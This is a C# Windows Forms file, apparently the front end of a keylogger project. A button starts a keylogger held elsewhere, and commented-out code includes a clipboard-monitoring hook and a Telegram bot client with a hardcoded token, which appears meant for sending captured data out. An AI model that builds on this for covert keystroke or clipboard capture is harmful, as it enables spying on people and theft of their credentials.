using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;

namespace ShowKeyBoard
{
    public partial class Form1 : Form
    {
        //static TelegramBotClient botClient = new TelegramBotClient("941129353:AAFlkcB2_wlZpkFyUhua7AdxtUQ8d2vggrE");


        //[DllImport("User32.dll", CharSet = CharSet.Auto)]
        //public static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
        //private IntPtr _ClipboardViewerNext;

        //protected override void WndProc(ref System.Windows.Forms.Message m)
        //{
        //    const int WM_DRAWCLIPBOARD = 0x308;

        //    switch (m.Msg)
        //    {
        //        case WM_DRAWCLIPBOARD:
        //            textBox1.Invoke(new MethodInvoker(() =>
        //            {
        //                textBox1.Text = Clipboard.GetText();
        //            }));
        //            break;
        //        default:
        //            base.WndProc(ref m);
        //            break;
        //    }
        //}


        public Form1()
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            InitializeComponent();
            
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            

        }

        private async void BotClient_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Controller.StopKeyLoger();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Controller.StartKeyLoger();
        }
    }

}
